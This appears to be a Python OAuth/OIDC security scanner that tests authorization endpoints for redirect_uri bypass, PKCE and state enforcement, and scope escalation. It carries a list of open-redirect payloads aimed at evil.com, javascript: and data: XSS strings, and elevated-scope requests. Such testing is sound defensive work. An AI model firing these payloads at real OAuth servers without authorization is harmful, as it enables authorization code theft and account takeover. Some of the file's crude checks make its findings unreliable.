#!/usr/bin/env python3
"""OAuth Flow Scanner — OAuth redirect_uri bypass + PKCE validation (CWE-601/613).

Tests OAuth 2.0 / OIDC implementation security:
- Open redirect via redirect_uri manipulation
- Missing or weak PKCE enforcement
- State parameter validation
- Token in URL fragment leakage
- Authorization code reuse
- Scope escalation
- Client credential exposure

⚠️ Contenu généré par IA — validation humaine requise avant utilisation.
"""

from __future__ import annotations

import json
import re
import sys
import os
from urllib.parse import urlparse, urlencode, parse_qs, urljoin

sys.path.insert(0, os.path.dirname(__file__))

from lib import (
    Finding, RateLimitedSession, get_session_from_env, log,
    parse_base_args, save_findings, load_config,
)

# ---------------------------------------------------------------------------
# OAuth endpoint discovery paths
# ---------------------------------------------------------------------------

OIDC_DISCOVERY_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/oauth/.well-known/openid-configuration",
    "/auth/.well-known/openid-configuration",
    "/realms/master/.well-known/openid-configuration",  # Keycloak
]

# Common OAuth endpoint paths (fallback if no discovery)
DEFAULT_AUTH_PATHS = [
    "/oauth/authorize", "/oauth2/authorize", "/auth/authorize",
    "/api/oauth/authorize", "/connect/authorize",
    "/oauth/token", "/oauth2/token", "/auth/token",
]

# Redirect URI bypass payloads
REDIRECT_URI_BYPASSES = [
    # Open redirect via path traversal
    "{base}/../evil.com",
    "{base}/..%2F..%2Fevil.com",
    # Subdomain confusion
    "{base}.evil.com",
    # URL confusion
    "{base}@evil.com",
    "{base}%40evil.com",
    # Fragment injection
    "{base}#@evil.com",
    # Extra path
    "{base}/callback/../../evil.com",
    # Double encoding
    "{base}%252f%252f%252fevil.com",
    # Whitespace
    "{base} evil.com",
    "{base}%20evil.com",
    # Null byte
    "{base}%00evil.com",
    # Different scheme
    "javascript://fake%0aalert(1)",
    "data:text/html,<script>alert(1)</script>",
]


def discover_oauth_config(
    session: RateLimitedSession,
    target: str,
    dry_run: bool = False,
) -> dict | None:
    """Discover OAuth/OIDC configuration via well-known endpoints."""
    for path in OIDC_DISCOVERY_PATHS:
        url = f"{target.rstrip('/')}{path}"
        if dry_run:
            log.info("[DRY-RUN] GET %s", url)
            continue

        try:
            resp = session.get(url, timeout=10)
            if resp.status_code == 200:
                try:
                    config = resp.json()
                    if "authorization_endpoint" in config or "issuer" in config:
                        log.info("Found OIDC config at %s", path)
                        return config
                except json.JSONDecodeError:
                    pass
        except Exception:
            pass

    return None


def scan_redirect_uri_bypass(
    session: RateLimitedSession,
    target: str,
    authorize_url: str,
    client_id: str | None = None,
    redirect_uri: str | None = None,
    dry_run: bool = False,
) -> list[Finding]:
    """Test redirect_uri bypass techniques."""
    findings: list[Finding] = []

    base_redirect = redirect_uri or f"{target.rstrip('/')}/callback"
    test_client_id = client_id or "test_client"

    for payload_template in REDIRECT_URI_BYPASSES:
        payload = payload_template.replace("{base}", base_redirect)

        params = urlencode({
            "response_type": "code",
            "client_id": test_client_id,
            "redirect_uri": payload,
            "scope": "openid",
            "state": "test_state_12345",
        })

        url = f"{authorize_url}?{params}"
        if dry_run:
            log.info("[DRY-RUN] GET %s", url[:120])
            continue

        try:
            resp = session.get(url, allow_redirects=False, timeout=10)

            # Check if the server redirected to our malicious URI
            location = resp.headers.get("Location", "")

            if resp.status_code in (301, 302, 303, 307, 308):
                # Check if redirect goes to an unauthorized domain
                if "evil.com" in location or "javascript:" in location or "data:" in location:
                    findings.append(Finding(
                        title=f"OAuth Open Redirect: redirect_uri bypass",
                        severity="high",
                        cwe="CWE-601",
                        endpoint=authorize_url,
                        method="GET",
                        description=f"OAuth authorize endpoint accepts manipulated redirect_uri",
                        steps=[
                            f"GET {authorize_url} with redirect_uri={payload}",
                            f"Server redirects to: {location[:100]}",
                        ],
                        impact="Authorization code theft via open redirect. OAuth token hijacking.",
                        evidence={
                            "payload": payload,
                            "status": resp.status_code,
                            "location": location[:200],
                        },
                        remediation=(
                            "Strict redirect_uri validation: exact string match, no wildcards. "
                            "Register allowed redirect URIs explicitly."
                        ),
                    ))
            elif resp.status_code == 200:
                # Some servers render the auth page with the bad redirect_uri
                if payload in resp.text:
                    findings.append(Finding(
                        title=f"OAuth Redirect URI Reflected",
                        severity="medium",
                        cwe="CWE-601",
                        endpoint=authorize_url,
                        method="GET",
                        description="Manipulated redirect_uri is reflected in the authorization page",
                        steps=[
                            f"GET {authorize_url} with redirect_uri={payload}",
                            f"Payload reflected in response body",
                        ],
                        impact="Potential phishing or XSS via reflected redirect_uri",
                        evidence={"payload": payload, "status": resp.status_code},
                        remediation="Validate redirect_uri strictly. Do not reflect unvalidated URIs.",
                    ))

        except Exception as e:
            log.debug("Redirect URI test error: %s", e)

    return findings


def scan_pkce_enforcement(
    session: RateLimitedSession,
    authorize_url: str,
    token_url: str | None = None,
    client_id: str | None = None,
    dry_run: bool = False,
) -> list[Finding]:
    """Check if PKCE is enforced."""
    findings: list[Finding] = []
    test_client_id = client_id or "test_client"

    # Try authorize without code_challenge
    params = urlencode({
        "response_type": "code",
        "client_id": test_client_id,
        "redirect_uri": "https://example.com/callback",
        "scope": "openid",
        "state": "test_state",
    })

    url = f"{authorize_url}?{params}"
    if dry_run:
        log.info("[DRY-RUN] GET %s (no PKCE)", url[:80])
        return findings

    try:
        resp = session.get(url, allow_redirects=False, timeout=10)

        # If server doesn't reject the request without PKCE
        if resp.status_code not in (400, 403):
            findings.append(Finding(
                title="PKCE Not Enforced on Authorization Endpoint",
                severity="medium",
                cwe="CWE-345",
                endpoint=authorize_url,
                method="GET",
                description="Authorization endpoint accepts requests without code_challenge parameter",
                steps=[
                    f"GET {authorize_url} without code_challenge",
                    f"Response: {resp.status_code} (expected 400 if PKCE enforced)",
                ],
                impact="Authorization code interception attacks possible without PKCE",
                evidence={"status": resp.status_code, "pkce_missing": True},
                remediation="Require PKCE (RFC 7636) with S256 method for all auth flows.",
            ))
    except Exception as e:
        log.debug("PKCE check error: %s", e)

    # Try with weak PKCE method (plain)
    params_plain = urlencode({
        "response_type": "code",
        "client_id": test_client_id,
        "redirect_uri": "https://example.com/callback",
        "scope": "openid",
        "state": "test_state",
        "code_challenge": "test_challenge_value",
        "code_challenge_method": "plain",
    })

    url_plain = f"{authorize_url}?{params_plain}"
    try:
        resp = session.get(url_plain, allow_redirects=False, timeout=10)
        if resp.status_code not in (400, 403):
            findings.append(Finding(
                title="PKCE Accepts Weak 'plain' Method",
                severity="medium",
                cwe="CWE-345",
                endpoint=authorize_url,
                method="GET",
                description="Authorization endpoint accepts PKCE with 'plain' method instead of requiring S256",
                steps=[
                    f"GET {authorize_url} with code_challenge_method=plain",
                    f"Response: {resp.status_code}",
                ],
                impact="PKCE protection weakened — code_verifier is transmitted in plain text",
                evidence={"status": resp.status_code, "method": "plain"},
                remediation="Reject 'plain' PKCE method. Require S256.",
            ))
    except Exception:
        pass

    return findings


def scan_state_validation(
    session: RateLimitedSession,
    authorize_url: str,
    client_id: str | None = None,
    dry_run: bool = False,
) -> list[Finding]:
    """Check state parameter validation."""
    findings: list[Finding] = []
    test_client_id = client_id or "test_client"

    # Try without state parameter
    params = urlencode({
        "response_type": "code",
        "client_id": test_client_id,
        "redirect_uri": "https://example.com/callback",
        "scope": "openid",
    })

    url = f"{authorize_url}?{params}"
    if dry_run:
        log.info("[DRY-RUN] GET %s (no state)", url[:80])
        return findings

    try:
        resp = session.get(url, allow_redirects=False, timeout=10)
        if resp.status_code not in (400, 403):
            findings.append(Finding(
                title="OAuth State Parameter Not Required",
                severity="medium",
                cwe="CWE-352",
                endpoint=authorize_url,
                method="GET",
                description="Authorization endpoint accepts requests without state parameter",
                steps=[
                    f"GET {authorize_url} without state parameter",
                    f"Response: {resp.status_code}",
                ],
                impact="CSRF attacks on the OAuth flow (authorization code injection)",
                evidence={"status": resp.status_code},
                remediation="Require and validate state parameter to prevent CSRF.",
            ))
    except Exception:
        pass

    return findings


def scan_scope_escalation(
    session: RateLimitedSession,
    authorize_url: str,
    client_id: str | None = None,
    dry_run: bool = False,
) -> list[Finding]:
    """Test scope escalation."""
    findings: list[Finding] = []
    test_client_id = client_id or "test_client"

    elevated_scopes = [
        "openid profile email admin",
        "openid profile email write:all",
        "openid profile email user:admin",
        "openid profile email * ",
    ]

    for scope in elevated_scopes:
        params = urlencode({
            "response_type": "code",
            "client_id": test_client_id,
            "redirect_uri": "https://example.com/callback",
            "scope": scope,
            "state": "test_state",
        })

        url = f"{authorize_url}?{params}"
        if dry_run:
            log.info("[DRY-RUN] Scope escalation: %s", scope)
            continue

        try:
            resp = session.get(url, allow_redirects=False, timeout=10)
            if resp.status_code in (200, 302):
                # Check if elevated scope was accepted
                location = resp.headers.get("Location", "")
                if "scope=" in location or resp.status_code == 200:
                    findings.append(Finding(
                        title=f"OAuth Scope Escalation: {scope}",
                        severity="high",
                        cwe="CWE-269",
                        endpoint=authorize_url,
                        method="GET",
                        description=f"Authorization endpoint accepts elevated scope: {scope}",
                        steps=[
                            f"GET {authorize_url} with scope={scope}",
                            f"Response: {resp.status_code}",
                        ],
                        impact="Client can request more permissions than authorized",
                        evidence={"scope": scope, "status": resp.status_code},
                        remediation="Validate requested scopes against client registration.",
                    ))
        except Exception:
            pass

    return findings


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main() -> None:
    parser = parse_base_args()
    parser.add_argument("--client-id", default=None, help="OAuth client ID to test with")
    parser.add_argument("--redirect-uri", default=None, help="Registered redirect URI")
    args = parser.parse_args()

    if args.verbose:
        import logging
        logging.getLogger().setLevel(logging.DEBUG)

    session = get_session_from_env()
    if args.rate_limit:
        session.min_interval = 1.0 / args.rate_limit

    config = load_config(args.config)
    client_id = args.client_id or config.get("oauth_client_id")
    redirect_uri = args.redirect_uri or config.get("oauth_redirect_uri")

    all_findings: list[Finding] = []

    log.info("=== OAuth Flow Scanner starting on %s ===", args.target)

    # Phase 1: Discover OAuth configuration
    log.info("--- Phase 1: OIDC Discovery ---")
    oauth_config = discover_oauth_config(session, args.target, args.dry_run)

    if oauth_config:
        authorize_url = oauth_config.get("authorization_endpoint", "")
        token_url = oauth_config.get("token_endpoint", "")
        log.info("Authorize: %s", authorize_url)
        log.info("Token: %s", token_url)

        # Check OIDC config for issues
        if not oauth_config.get("code_challenge_methods_supported"):
            all_findings.append(Finding(
                title="OIDC Config: PKCE Not Advertised",
                severity="medium",
                cwe="CWE-345",
                endpoint=f"{args.target}/.well-known/openid-configuration",
                method="GET",
                description="OIDC discovery does not advertise PKCE support",
                steps=["Check code_challenge_methods_supported in OIDC config"],
                impact="Clients may not use PKCE, weakening the auth flow",
                evidence={"config_keys": list(oauth_config.keys())[:20]},
                remediation="Add code_challenge_methods_supported: ['S256'] to OIDC configuration.",
            ))
    else:
        # Fallback: try common paths
        authorize_url = None
        token_url = None
        for path in DEFAULT_AUTH_PATHS:
            if "authorize" in path:
                url = f"{args.target.rstrip('/')}{path}"
                if not args.dry_run:
                    try:
                        resp = session.get(url, allow_redirects=False, timeout=5)
                        if resp.status_code != 404:
                            authorize_url = url
                            break
                    except Exception:
                        pass

    if authorize_url:
        log.info("--- Phase 2: Redirect URI Bypass ---")
        all_findings.extend(
            scan_redirect_uri_bypass(session, args.target, authorize_url, client_id, redirect_uri, args.dry_run)
        )

        log.info("--- Phase 3: PKCE Enforcement ---")
        all_findings.extend(
            scan_pkce_enforcement(session, authorize_url, token_url, client_id, args.dry_run)
        )

        log.info("--- Phase 4: State Validation ---")
        all_findings.extend(
            scan_state_validation(session, authorize_url, client_id, args.dry_run)
        )

        log.info("--- Phase 5: Scope Escalation ---")
        all_findings.extend(
            scan_scope_escalation(session, authorize_url, client_id, args.dry_run)
        )
    else:
        log.warning("No OAuth authorize endpoint found")

    log.info("=== OAuth Flow Scanner complete: %d findings ===", len(all_findings))
    save_findings(all_findings, "oauth-flow")


if __name__ == "__main__":
    main()
